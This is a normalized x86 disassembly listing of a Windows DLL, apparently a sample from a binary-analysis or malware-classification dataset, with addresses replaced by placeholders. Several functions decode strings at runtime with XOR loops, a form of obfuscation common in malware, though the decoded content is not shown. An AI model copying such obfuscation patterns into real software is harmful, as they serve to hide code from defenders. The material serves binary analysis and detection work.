mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x20 ]
test cx cx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push esi
push edi
push eax
mov eax [ ebp + 0x8 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
push eax
call sub_10003150
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] edx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov edx [ eax ]
push 0x1
push ecx
mov ecx [ eax + 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
lea eax [ esp + 0x28 ]
push eax
push ecx
call sub_10024610
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_1007f310
add esp 0xc
test eax eax
je r-xdata
sub_1001e8ee
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
sar esi 0x1
sar edi 0x1
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_1006e175
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push eax
call sub_10005838
add esp 0x18
test eax eax
jne r-xdata
mov edx esi
cmp esi edi
jl r-xdata
test eax eax
jne r-xdata
sub eax 0x2
call sub_1005b670
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push ebx
jmp r-xdata
mov edx edi
pop edi
pop esi
pop ebp
retn
test edx edx
jg r-xdata
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
xor eax eax
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add eax 0x2
add ecx 0x2
dec edx
cmp esi edi
je r-xdata
pop ebx
test eax eax
jne r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_1001e9b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x18 ]
push 0x3
mov [ eax ] ecx
pop eax
pop ebp
retn 0x1c
sub_1001e9d0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_1002d970
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
mov [ esi + 0x6c ] eax
sub_1001ea50
push ebp
mov ebp esp
push 0xffffffff
push sub_100885cd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x114 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x118 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x110 ] eax
movsx eax [ ecx ]
xor eax 0xffc5
xor ecx ecx
and eax 0xff
mov [ ebp - 0x104 ] ax
mov [ ebp - 0x102 ] cx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xffa5
and esi 0xff
mov [ ebp + eax * 2 - 0x20 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0xb4 ] 0x7
mov [ ebp - 0xb8 ] edi
mov [ ebp - 0xc8 ] cx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0xc8 ]
call sub_10034100
lea edx [ ebp - 0xc8 ]
push edx
lea edx [ ebp - 0x104 ]
lea esi [ ebp - 0x100 ]
mov [ ebp - 0x4 ] edi
call sub_10040e00
add esp 0x4
push eax
lea edx [ ebp - 0x20 ]
lea esi [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x1
call sub_100519f0
add esp 0x4
mov ebx 0x8
cmp [ ebp - 0xec ] ebx
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xf0 ] edi
mov [ ebp - 0x100 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0xb4 ] ebx
jb r-xdata
mov eax [ ebp - 0x100 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0xb8 ] edi
mov [ ebp - 0xc8 ] ax
mov edx [ ebp - 0xc8 ]
push edx
call sub_1000a86e
add esp 0x4
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x4e
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x1a
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x24 ] ax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffa7
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x60 ] esi
mov esi [ ebp - 0x114 ]
mov [ ebp - 0x14 ] ax
xor ecx ecx
mov eax esi
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x74 ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x74 ]
call sub_10034100
lea edx [ ebp - 0x74 ]
push edx
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x5
call sub_10040e00
add esp 0x4
push eax
lea edx [ ebp - 0x18 ]
lea esi [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x6
call sub_100519f0
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x7
call sub_1006da10
cmp [ ebp - 0x98 ] ebx
jb r-xdata
xor ecx ecx
mov esi 0x7
mov [ ebp - 0x98 ] esi
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] cx
cmp [ ebp - 0x7c ] ebx
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] ax
cmp [ ebp - 0x60 ] ebx
jb r-xdata
mov edx [ ebp - 0x90 ]
push edx
call sub_1000a86e
add esp 0x4
mov edx [ r--data ]
movsx eax [ edx ]
mov edx [ r--data ]
xor eax 0x58
and eax 0xff
xor ecx ecx
mov [ ebp - 0x108 ] ax
mov [ ebp - 0x106 ] cx
movsx eax [ edx ]
xor eax 0x72
and eax 0xff
mov [ ebp - 0x60 ] esi
mov esi [ ebp - 0x118 ]
xor edx edx
mov [ ebp - 0x10c ] ax
mov eax esi
mov [ ebp - 0x74 ] dx
mov [ ebp - 0x10a ] cx
mov [ ebp - 0x64 ] edi
lea edx [ eax + 0x2 ]
jmp r-xdata
mov ecx [ ebp - 0x74 ]
push ecx
call sub_1000a86e
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x74 ]
call sub_10034100
lea eax [ ebp - 0x74 ]
push eax
lea edx [ ebp - 0x108 ]
lea esi [ ebp - 0xac ]
mov [ ebp - 0x4 ] bl
call sub_10040e00
add esp 0x4
push eax
lea edx [ ebp - 0x10c ]
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x9
call sub_100519f0
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0xa
call sub_1006da10
cmp [ ebp - 0x7c ] ebx
jb r-xdata
xor edx edx
mov esi 0x7
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] dx
cmp [ ebp - 0x98 ] ebx
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x98 ] esi
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] cx
cmp [ ebp - 0x60 ] ebx
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xe4 ]
cmp [ ebp - 0xd0 ] ebx
jae r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x110 ]
push eax
call sub_10069160
add esp 0x4
mov esi eax
cmp [ ebp - 0xd0 ] ebx
jb r-xdata
lea ecx [ ebp - 0xe4 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_1000a86e
add esp 0x4
sub_1001ee70
push ebp
mov ebp esp
push 0xffffffff
push sub_10088f36
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2e0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
xor ebx ebx
cmp [ esi ] ebx
jne r-xdata
lea ecx [ ebp - 0x2dc ]
push ecx
lea edx [ ebp - 0x2d8 ]
push edx
mov [ ebp - 0x2d8 ] ebx
mov [ ebp - 0x2dc ] ebx
call sub_100505a0
mov edi eax
add esp 0x8
cmp edi ebx
je r-xdata
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edi [ ebp - 0x2dc ]
lea ecx [ ebp - 0x2d8 ]
call sub_10056b90
mov edi eax
cmp edi ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x144
call sub_10069020
lea eax [ ebp - 0x14c ]
push edi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0xcc ]
lea esi [ ebp - 0x130 ]
mov [ ebp - 0x4 ] ebx
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xe
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x11c ] esi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
mov ecx [ ebp - 0x2dc ]
mov edx [ ebp - 0x2d8 ]
push eax
call sub_1000d0d0
test eax eax
jne r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0x11e
call sub_10069020
lea ecx [ ebp - 0x14c ]
push edi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0xc4 ]
lea esi [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x2
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xe
mov [ ebp - 0x4 ] 0x3
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x11c ] esi
jb r-xdata
xor edx edx
mov [ ebp - 0x11c ] 0x7
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x130 ] dx
cmp [ ebp - 0x138 ] esi
jb r-xdata
mov ecx [ ebp - 0x130 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x2d8 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x82
call sub_10069020
lea edx [ ebp - 0x78 ]
mov eax 0x49
call sub_10069020
lea edx [ ebp - 0x40 ]
mov eax 0x1d
call sub_10069020
lea edx [ ebp - 0x28 ]
mov eax 0x129
call sub_10069020
mov eax [ esi ]
lea edx [ ebp - 0x2e4 ]
push edx
lea ecx [ ebp - 0x2ec ]
push ecx
lea edx [ ebp - 0x2e8 ]
push edx
lea ecx [ ebp - 0x2e0 ]
push ecx
mov [ ebp - 0x2e0 ] ebx
mov [ ebp - 0x2e8 ] ebx
mov [ ebp - 0x2e4 ] ebx
mov [ ebp - 0x2ec ] ebx
call sub_100276a0
lea edx [ ebp - 0x114 ]
mov eax 0x12d
call sub_10069020
mov edx [ ebp - 0x2e4 ]
push edx
lea eax [ ebp - 0x264 ]
push eax
call sub_10057f20
mov ebx eax
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x2ec ]
push ecx
lea edx [ ebp - 0x1f4 ]
push edx
call sub_10057f20
add esp 0x10
mov edi eax
lea eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x2d4 ]
mov [ ebp - 0x4 ] 0x5
call sub_1004a920
push eax
lea edx [ ebp - 0x114 ]
lea esi [ ebp - 0x2b8 ]
mov [ ebp - 0x4 ] 0x6
call sub_10040e00
add esp 0x4
mov [ ebp - 0x4 ] 0x7
mov edx [ ebp - 0x2e0 ]
push eax
lea esi [ ebp - 0x280 ]
call sub_100519f0
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x248 ]
mov [ ebp - 0x4 ] 0x8
call sub_100519f0
add esp 0x4
push eax
lea edx [ ebp - 0x78 ]
lea esi [ ebp - 0x210 ]
mov [ ebp - 0x4 ] 0x9
call sub_100519f0
add esp 0x4
mov [ ebp - 0x4 ] 0xa
push eax
mov edx [ ebp - 0x2e8 ]
lea esi [ ebp - 0x184 ]
call sub_100519f0
add esp 0x4
push eax
mov edx r--data
lea esi [ ebp - 0x1bc ]
mov [ ebp - 0x4 ] 0xb
call sub_100519f0
add esp 0x4
push eax
lea edx [ ebp - 0x28 ]
lea esi [ ebp - 0x1a0 ]
mov [ ebp - 0x4 ] 0xc
call sub_100519f0
add esp 0x4
mov ecx eax
mov eax edi
lea edi [ ebp - 0x29c ]
mov [ ebp - 0x4 ] 0xd
call sub_1006b070
push eax
mov edx r--data
lea esi [ ebp - 0x22c ]
mov [ ebp - 0x4 ] 0xe
call sub_100519f0
add esp 0x4
push eax
lea edx [ ebp - 0x40 ]
lea esi [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0xf
call sub_100519f0
add esp 0x4
mov ecx eax
mov eax ebx
lea edi [ ebp - 0x1d8 ]
mov [ ebp - 0x4 ] 0x10
call sub_1006b070
mov edx eax
mov ecx 0xe
mov [ ebp - 0x4 ] 0x11
call sub_10022b50
mov ecx edi
call sub_100702e0
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x22c ]
call sub_100702e0
lea ecx [ ebp - 0x29c ]
call sub_100702e0
lea ecx [ ebp - 0x1a0 ]
call sub_100702e0
lea ecx [ ebp - 0x1bc ]
call sub_100702e0
lea ecx [ ebp - 0x184 ]
call sub_100702e0
lea ecx [ ebp - 0x210 ]
call sub_100702e0
lea ecx [ ebp - 0x248 ]
call sub_100702e0
lea ecx [ ebp - 0x280 ]
call sub_100702e0
lea ecx [ ebp - 0x2b8 ]
call sub_100702e0
lea ecx [ ebp - 0x2d4 ]
call sub_100702e0
lea ecx [ ebp - 0x1f4 ]
call sub_100702e0
lea ecx [ ebp - 0x264 ]
call sub_100702e0
mov eax 0x4
jmp r-xdata
xor eax eax
mov [ ebp - 0x11c ] 0x7
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x130 ] ax
cmp [ ebp - 0x138 ] esi
jb r-xdata
mov edx [ ebp - 0x130 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x14c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x14c ]
push ecx
call sub_1000a86e
add esp 0x4
sub_1001f2f1
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
movzx eax [ ebp + 0xe ]
xor ecx ecx
test eax 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_10051d7c
movzx edx [ ebp + 0xe ]
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_10051d7c
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_1001f3b4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100098f5
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_1001f400
push ebp
mov ebp esp
push 0xffffffff
push sub_10086448
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_1000c927
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_10004aa4
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003c9c
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1005c3b0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_1000c927
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_100661c2
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10055e2a
lea ecx [ ebp + 0x8 ]
call sub_10003c9c
push esi
call sub_10008715
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1001f53a
push 0x28
mov eax sub_10085530
call sub_10026266
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_10008d33
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_1002e3ac
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_10034577
jmp r-xdata
sub_1001f5e0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_1002d970
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001f60e
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d4e1
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1001f6ab
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_1000c429
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_1004f58b
push eax
push edi
push esi
call sub_10042442
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_100579de
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1005aa2b
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_1001f715
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1005f4bc
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1001f770
push ebp
mov ebp esp
push 0xffffffff
push sub_10086358
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] edi
cmp eax edi
jne r-xdata
cmp ecx edi
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_100299a0
lea eax [ edi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] edi
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_100299a0
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x14 ]
call sub_10020e20
test eax eax
je r-xdata
lea esi [ ebp - 0x14 ]
call sub_100299a0
mov eax 0x3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
lea ebx [ esi + eax * 4 ]
cmp esi ebx
je r-xdata
lea esi [ ebp - 0x14 ]
call sub_100299a0
mov eax 0x6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x14 ]
call sub_100299a0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0xa
jae r-xdata
mov ecx [ esi ]
mov edx [ ebp + 0xc ]
push ecx
push edx
mov ecx 0x104
call sub_10012950
test eax eax
jne r-xdata
lea esi [ ebp - 0x14 ]
call sub_100299a0
mov eax 0x7
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add [ ebp + 0xc ] 0x208
add esi 0x4
inc edi
cmp esi ebx
jne r-xdata
sub_1001f8b0
push edi
mov edi eax
cmp edi esi
je r-xdata
mov eax esi
pop edi
retn
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_1002d970
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
push 0xffffffff
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
push 0x0
add edi 0x70
push edi
lea ecx [ esi + 0x70 ]
mov [ esi + 0x6c ] eax
call sub_1002d970
sub_1001f91c
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_1005dbd0
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x5 ] al
jmp r-xdata
mov al [ esi + 0x5 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_1001f950
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x8c ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2d
and edx 0xff
mov [ ebp + eax * 2 - 0x40 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x8c ]
push edx
mov [ ebp - 0x26 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x40 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0x54 ] 0x8
lea eax [ edi + 0x40 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x24 ]
lea eax [ ecx + 0x14 ]
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_1002f620
mov ebx [ ebp - 0x14 ]
